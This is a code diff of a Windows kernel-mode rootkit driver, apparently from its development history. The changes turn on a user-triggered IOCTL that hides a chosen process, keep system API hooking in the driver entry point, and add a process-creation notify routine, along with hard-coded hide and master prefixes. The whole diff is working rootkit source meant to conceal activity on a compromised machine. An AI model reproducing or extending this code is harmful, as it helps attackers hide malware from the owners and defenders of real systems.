@@ -19,10 +19,6 @@ PMODULE_ENTRY	gp_HiddenDriver = NULL;
 //active config
 ROOTKIT_SETUP_DATA	offsets = {0};
 
-//WCHAR hidePrefixW[] = L"myRootkit";
-//CHAR hidePrefixA[] =  "myRootkit";
-//CHAR masterPrefix[] = "bill";	
-
 UNICODE_STRING hidePrefixW;
 char *hidePrefixA;
 char *masterPrefix;
@@ -45,6 +41,20 @@ BOOLEAN SetupOffsets();
 
 //Import NtBuildNumber from ntoskrnl.exe
 __declspec(dllimport) ULONG NtBuildNumber;
+
+VOID ProcessNotify(
+	IN HANDLE  hParentId, 
+	IN HANDLE  hProcessId, 
+	IN BOOLEAN bCreate
+	)
+{
+    if (bCreate)
+        DbgPrint("On process create PID=%ld\n",hProcessId);
+    else
+        DbgPrint("On process destroy PID=%ld\n",hProcessId); 
+        
+    return;    
+}
 
 NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
@@ -121,6 +131,10 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 
 	//Delete the device
 //	IoDeleteDevice(DriverObject->DeviceObject);
+    
+    
+	PsSetCreateProcessNotifyRoutine( ProcessNotify  , TRUE );
+
 	DbgPrint("OnUnload leaved\n");
 
 	ExFreePool( hidePrefixA );
@@ -159,11 +173,11 @@ NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 
 	case IOCTL_HIDE_PROCESS:
 		DbgPrint("Before IOCTL_HIDE_PROCESS\n");
-		__asm int 3
-//		if (inputSize == sizeof(ULONG)) {
-//			DbgPrint("Lets hide something...");
-//			OnProcessHide( *(ULONG*)pInputBuffer );
-//		}
+//		__asm int 3
+		if (inputSize == sizeof(ULONG)) {
+			DbgPrint("Lets hide something...");
+			OnProcessHide( *(ULONG*)pInputBuffer );
+		}
 		break;
 
 	default:
@@ -247,6 +261,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	if (masterPrefix == NULL) {
 		return STATUS_UNSUCCESSFUL;
 	}
+	
 	strcpy( masterPrefix , "bill");
 	DbgPrint( "masterPrefix %s\n",masterPrefix);
 
@@ -282,8 +297,10 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 
 	SetupIndexes();
 	HookApis();
+	
+	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );
 
-	DbgPrint("DriverEntry leaved");
+	DbgPrint("DriverEntry leaved\n");
 	return status;
 }
 
